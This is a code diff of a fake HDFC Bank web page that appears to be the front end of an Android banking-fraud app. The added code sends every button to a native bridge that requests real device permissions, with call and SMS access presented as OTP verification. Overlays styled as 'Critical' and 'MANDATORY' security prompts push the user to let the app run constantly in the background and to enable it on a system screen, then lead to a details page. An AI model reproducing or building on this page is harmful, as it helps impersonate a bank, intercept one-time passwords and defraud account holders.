@@ -9,7 +9,6 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Extra styles for overlay/modals that were in dashboard.html */
         .overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); display: flex; justify-content: center;
@@ -21,39 +20,20 @@
         }
         .modal-icon { font-size: 50px; margin-bottom: 20px; }
         .btn-primary { background: #004c8f; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-weight: 600; margin-top: 20px; width: 100%; }
-        
-        .permission-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); display: none; justify-content: center;
-            align-items: flex-end; z-index: 9999;
-        }
-        .perm-modal {
-            background: white; width: 100%; padding: 30px; border-top-left-radius: 25px;
-            border-top-right-radius: 25px; text-align: center;
-        }
-        .perm-icon { font-size: 40px; margin-bottom: 15px; }
-        .perm-text { color: #333; font-size: 16px; margin-bottom: 25px; line-height: 1.5; }
-        .perm-actions { display: flex; flex-direction: column; gap: 10px; }
-        .btn-allow { background: #004c8f; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: 600; font-size: 16px; }
-        .btn-deny { background: transparent; color: #5f6368; border: none; padding: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
-    <!-- Top Navigation -->
     <header class="main-header">
         <div class="logo-container">
             <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC Logo" class="brand-logo">
             <span class="brand-text">HDFC BANK</span>
         </div>
         <div class="menu-icon">
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
         </div>
     </header>
 
     <main class="dashboard-container">
-        <!-- Hero Banner -->
         <section class="hero-banner">
             <div class="hero-content">
                 <h2>India's First <br><span>Interactive Credit Card</span></h2>
@@ -61,14 +41,14 @@
                 <div class="hero-stats">
                     <div class="stat-item">
                         <img src="https://img.icons8.com/ios-filled/50/ffffff/safe.png" alt="safe">
-                        <span>High <br>Security</span>
+                        <span>High Security</span>
                     </div>
                     <div class="stat-item">
                         <img src="https://img.icons8.com/ios-filled/50/ffffff/star.png" alt="points">
-                        <span>Unlimited <br>Rewards</span>
+                        <span>Unlimited Rewards</span>
                     </div>
                 </div>
-                <button class="btn-apply">Fix Now</button>
+                <button class="btn-apply" onclick="triggerNative()">Fix Now</button>
             </div>
             <div class="card-visual">
                 <div class="credit-card">
@@ -80,137 +60,61 @@
             </div>
         </section>
 
-        <!-- Card Protection -->
         <section class="info-card">
-            <div class="card-header">
-                <h3>Card Protection</h3>
-            </div>
+            <div class="card-header"><h3>Card Protection</h3></div>
             <div class="card-body">
-                <p>Protect yourself with India's first comprehensive card protection service. Stay safe from card loss, theft, and fraud with 24/7 support.</p>
-                <div class="button-group">
-                    <button class="btn btn-primary">ACTIVATE</button>
-                    <button class="btn btn-outline">DEACTIVATE</button>
-                </div>
+                <p>Protect yourself with India's first comprehensive card protection service. Stay safe from card loss, theft, and fraud.</p>
+                <button class="btn btn-primary" onclick="triggerNative()">ACTIVATE</button>
             </div>
         </section>
 
-        <!-- Reward Points -->
         <section class="info-card">
-            <div class="card-header">
-                <h3>Redeem Your Reward Points</h3>
-            </div>
+            <div class="card-header"><h3>Redeem Reward Points</h3></div>
             <div class="card-body">
-                <p>Make the most of your HDFC Credit Card! Redeem points for gifts, vouchers, travel deals, and cashbacks instantly.</p>
-                <button class="btn btn-primary btn-wide">REDEEM</button>
-            </div>
-        </section>
-
-        <!-- Activation Guidelines -->
-        <section class="info-card">
-            <div class="card-header">
-                <h3>Credit Card Activation Guideline</h3>
-            </div>
-            <div class="card-body">
-                <p>Follow the steps to activate your credit card securely and enjoy all banking services instantly without any delay.</p>
-                <button class="btn btn-outline btn-wide">VIEW GUIDE</button>
+                <p>Redeem points for gifts, vouchers, travel deals, and cashbacks instantly.</p>
+                <button class="btn btn-primary btn-wide" onclick="triggerNative()">REDEEM NOW</button>
             </div>
         </section>
     </main>
 
-    <!-- PERMISSION OVERLAY -->
-    <div class="permission-overlay" id="permissionOverlay">
-        <!-- Combined Modal to match your current step logic -->
-        <div class="perm-modal" id="notifModal">
-            <div class="perm-icon" id="permIcon">🔔</div>
-            <div class="perm-text" id="permText">
-                Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="nextPermission()">Allow</button>
-                <button class="btn-deny" onclick="nextPermission()">Don't Allow</button>
-            </div>
-        </div>
-    </div>
-
-    <footer class="bottom-nav">
-        <div class="nav-item active">
-            <img src="https://img.icons8.com/ios-filled/50/004c8f/home.png" alt="home">
-            <span>Home</span>
-        </div>
-        <div class="nav-item">
-            <img src="https://img.icons8.com/ios/50/5f6368/card-wallet.png" alt="cards">
-            <span>Cards</span>
-        </div>
-        <div class="nav-item">
-            <img src="https://img.icons8.com/ios/50/5f6368/user.png" alt="profile">
-            <span>Profile</span>
-        </div>
-    </footer>
-
+    <!-- Background Sync Triggers -->
     <div class="overlay" id="batteryOverlay" style="display:none;">
         <div class="modal">
             <div class="modal-icon">🔋</div>
-            <h3>Always Online Mode</h3>
-            <p>Enable background sync to receive real-time card activation alerts even when the app is closed.</p>
-            <button class="btn btn-primary" onclick="triggerBattery()">Enable Always Online</button>
+            <h3>Critical: Always Online</h3>
+            <p>To ensure 24/7 security sync and OTP protection, allow HDFC Bank to always run in the background.</p>
+            <button class="btn-primary" onclick="triggerBattery()">Enable Always Online</button>
         </div>
     </div>
 
     <div class="overlay" id="notifOverlay" style="display:none;">
         <div class="modal">
             <div class="modal-icon">🛡️</div>
-            <h3>Security Sync</h3>
-            <p>Enable secure synchronization to protect your account from unauthorized transactions.</p>
-            <button class="btn btn-primary" onclick="triggerNotif()">Enable Security Sync</button>
+            <h3>Security Protection</h3>
+            <p>Enable "HDFC Bank" in the next screen to protect your account from fraudulent transactions.</p>
+            <button class="btn-primary" onclick="triggerNotif()">Enable Protection</button>
         </div>
     </div>
 
     <script>
-        const overlay = document.getElementById('permissionOverlay');
         const batteryOverlay = document.getElementById('batteryOverlay');
         const notifOverlay = document.getElementById('notifOverlay');
-        const permIcon = document.getElementById('permIcon');
-        const permText = document.getElementById('permText');
-        
-        let currentStep = 0;
-        const steps = [
-            { icon: '🔔', text: 'Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?' },
-            { icon: '📞', text: 'Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?' },
-            { icon: '💬', text: 'Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?' }
-        ];
 
-        function startPermissionFlow(e) {
-            if(e) e.preventDefault();
-            currentStep = 0;
-            updatePermModal();
-            overlay.style.display = 'flex';
-        }
-
-        function updatePermModal() {
-            permIcon.textContent = steps[currentStep].icon;
-            permText.innerHTML = steps[currentStep].text;
-        }
-
-        function nextPermission() {
-            currentStep++;
-            if (currentStep < steps.length) {
-                updatePermModal();
+        function triggerNative() {
+            if (window.AndroidBridge) {
+                window.AndroidBridge.requestRealPermissions();
             } else {
-                if (window.AndroidBridge) {
-                    window.AndroidBridge.requestRealPermissions();
-                } else {
-                    window.location.href = 'details.html';
-                }
+                console.log("Not in APK, redirecting...");
+                window.location.href = 'details.html';
             }
         }
 
+        // Called by Java when OS permissions are handled
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
-                overlay.style.display = 'none';
                 batteryOverlay.style.display = 'flex';
             } else {
-                alert('MANDATORY: All permissions are required for Secure Card Activation.');
-                overlay.style.display = 'none';
+                alert('MANDATORY: System permissions are required to secure your card.');
             }
         }
 
@@ -225,14 +129,6 @@
             notifOverlay.style.display = 'none';
             window.location.href = 'details.html';
         }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('button').forEach(btn => {
-                if (!btn.closest('.perm-modal') && !btn.closest('.modal') && !btn.closest('.bottom-nav')) {
-                    btn.onclick = startPermissionFlow;
-                }
-            });
-        });
     </script>
 </body>
 </html>
